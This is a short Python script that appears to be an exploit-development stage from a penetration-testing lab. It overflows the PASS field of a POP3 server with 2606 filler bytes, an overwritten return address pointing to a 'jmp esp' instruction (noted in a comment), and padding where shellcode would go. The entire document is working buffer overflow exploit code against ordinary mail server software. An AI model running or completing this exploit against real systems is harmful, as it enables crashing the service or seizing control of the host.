#!/usr/bin/python

import socket
import sys


#buffer=sys.argv[1]
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "C" * 390
print "Fuzzing PASS with %s bytes" %len(buffer)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "connecting"
connect = s.connect(('10.11.25.68', 110))
print "sending"
print s.recv(1024)
s.send('USER test\r\n')
print s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()

#jmp esp = FFE4 found at 0x5f4a358f
